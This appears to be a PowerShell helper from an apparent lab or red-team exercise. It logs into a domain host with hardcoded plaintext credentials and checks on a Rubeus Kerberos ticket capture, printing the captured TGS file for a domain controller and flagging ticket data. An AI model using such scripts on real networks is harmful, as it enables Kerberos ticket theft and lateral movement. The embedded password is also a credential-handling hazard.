[CmdletBinding()]
param(
    [string]$TargetHost = "mbr01.child.cadre.local",
    [string]$Username = "child.cadre.local\analyst_t1",
    [string]$Password = "T13r_An@lyst!"
)
$ErrorActionPreference = "Continue"

$cred = New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName $TargetHost -Credential $cred

Invoke-Command -Session $session -ScriptBlock {
    $dir = 'C:\Windows\Temp\cadre-tools\T102-capture'
    Write-Output "--- monitor.pid ---"
    if (Test-Path "$dir\monitor.pid") { Get-Content "$dir\monitor.pid" }
    Write-Output "--- Rubeus processes ---"
    Get-Process -Name Rubeus -ErrorAction SilentlyContinue | Select-Object Id, StartTime | ForEach-Object { Write-Output "$($_.Id)|$($_.StartTime)" }
    Write-Output "--- tgs file ---"
    if (Test-Path "$dir\dc02_tgs.txt") {
        $c = Get-Content "$dir\dc02_tgs.txt" -Raw
        Write-Output "BYTES $($c.Length)"
        if ($c -match '(?i)KIRBI') { Write-Output "KIRBI_FOUND" }
        Get-Content "$dir\dc02_tgs.txt" -Tail 20 | ForEach-Object { Write-Output "T|$_" }
    } else { Write-Output "NO_TGS_FILE" }
    Write-Output "--- err file ---"
    if (Test-Path "$dir\dc02_tgs.txt.err") { Get-Content "$dir\dc02_tgs.txt.err" -Tail 10 | ForEach-Object { Write-Output "E|$_" } }
}
Remove-PSSession $session
